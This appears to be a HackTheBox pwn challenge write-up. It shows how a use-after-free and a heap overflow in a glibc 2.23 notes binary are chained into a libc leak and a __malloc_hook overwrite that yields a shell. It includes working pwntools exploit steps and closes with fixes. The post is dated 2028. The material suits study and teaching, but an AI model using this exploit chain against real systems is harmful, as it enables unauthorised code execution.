---
layout: post
title: "Spellbook"
date: 2028-02-29 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, heap, glibc-2.23, use-after-free, fastbin, malloc-hook, one-gadget]
description: "A glibc-2.23 heap-notes binary with two bugs — a delete that never NULLs its table slot (use-after-free) and an edit that reads a fixed size into a variable buffer — chained into an unsorted-bin libc leak and a fastbin fd poison over __malloc_hook to a one_gadget shell."
---

## Overview

Spellbook is a Medium pwn challenge: a menu-driven spellbook (add / show / edit / delete) built against the ancient **glibc 2.23** with Full RELRO, a stack canary, NX, and PIE. The mitigations on the binary don't matter much — the old libc (no tcache, `__malloc_hook` still live) is the real target, and two small logic bugs are enough to reach it.

## The bugs

Each spell is a `malloc(0x28)` struct followed by a separate `malloc(size)` content buffer:

```
+0x00  name[0x18]
+0x18  content_ptr    -> content buffer (size 1..1000)
+0x20  size
```

1. **`delete` never NULLs `table[idx]`.** It runs `free(content_ptr); free(struct);` and returns, leaving the global slot pointing at the freed struct (which still holds the freed `content_ptr`). That's a [use-after-free](https://cwe.mitre.org/data/definitions/416.html) — `show` and `edit` keep operating on freed chunks.
2. **`edit` reads a fixed `0x1f` bytes into the content buffer** regardless of its real size — a heap overflow — and writes through the possibly-dangling `content_ptr`.

## Step 1 — libc leak via UAF + unsorted bin

Allocate two spells: the first with a large content (`0x90` → chunk `0xa0`, too big for a fastbin), the second small (it guards the first off the top chunk). `delete(0)` frees `content0` into the **unsorted bin**, so its `fd`/`bk` become `main_arena+0x58`. Because the slot was never cleared, `show(0)` prints the freed buffer via `%s` → a `main_arena` pointer → libc base:

```python
main_arena  = leak - 88
libc.address = main_arena - (libc.sym['__malloc_hook'] + 0x10)
```

## Step 2 — fastbin fd poison to `__malloc_hook`

`delete(1)` drops `content1` (chunk `0x70`) into `fastbin[0x70]` and `struct1` into `fastbin[0x30]`, both dangling. The UAF `edit(1)` then writes `content1.fd = __malloc_hook - 0x23` — the well-known fake chunk whose size field reads `0x7f` (a valid `0x70`-fastbin size) from the hook-alignment bytes.

**The non-obvious gotcha:** every `add` mallocs *twice* (struct `0x30`, then content). The `edit` name-write lands on the freed `struct1`, and if left as junk it corrupts `struct1.fd`, so a later `malloc(0x30)` dereferences garbage and crashes before the hook fires. The fix is to write the name as **`0x17` NUL bytes** so `struct1.fd` becomes `NULL`: the `0x30` fastbin terminates cleanly and the next `malloc(0x30)` falls back to the top chunk. (The name field is `0x18` wide, so `0x17` NULs never touch `content_ptr`.)

Two more `add`s of content-size `0x60` walk the poisoned `fastbin[0x70]`: the first pops `content1`, the second returns the fake chunk over the hooks (user data at `__malloc_hook-0x13`). Write `0x13` padding + `p64(one_gadget)` → `__malloc_hook = one_gadget`. Choosing *Add* once more triggers a `malloc`, the hook fires, and the first one_gadget (`0x4527a`) lands a shell.

## Solution

The full commented exploit is `solve.py`; the core sequence:

```python
add(0, b'A'*8, 0x90, b'leak')     # 0xa0 leak chunk
add(1, b'B'*8, 0x60, b'victim')   # 0x70 fastbin victim, guards leak off top
delete(0); show(0)                # UAF unsorted-bin leak -> libc base
delete(1)
edit(1, b'\x00'*0x17, p64(malloc_hook - 0x23))   # zero freed struct.fd; poison content1.fd
add(2, b'D'*8, 0x60, b'pop')                      # pop content1
add(3, b'E'*8, 0x60, b'\x00'*0x13 + p64(og))      # __malloc_hook = one_gadget
menu(1); sendlineafter(b'entry: ', b'5')          # trigger malloc -> shell
```

`cat flag.txt` on the resulting shell prints the flag `HTB{...}` (redacted).

> The binary ships `./glibc/ld-linux-x86-64.so.2` as a *relative* `PT_INTERP`, so run it with the challenge directory as CWD (`process('./spellbook', cwd=...)`). The same libc ships with the challenge, so the remote offsets match local — give the exploit a connect-retry loop, since the instance's port can take a while to bind.

## Why it worked

Freeing without clearing the owning pointer is the root cause. On glibc 2.23 there is no tcache double-free/key protection, and `malloc` still honors `__malloc_hook`, so a single fastbin `fd` overwrite hands out a chunk over the hook and an attacker-chosen `one_gadget` runs with no further effort.

## Fix / defense

- **NULL the pointer on free** (`table[idx] = NULL`) — this alone kills the UAF.
- Bound `edit` to the buffer's real allocated size instead of a hard-coded `0x1f`.
- Upgrade libc: glibc ≥ 2.29 adds tcache double-free keys, and ≥ 2.34 removes `__malloc_hook`/`__free_hook` entirely, closing the fastbin-to-hook finish.
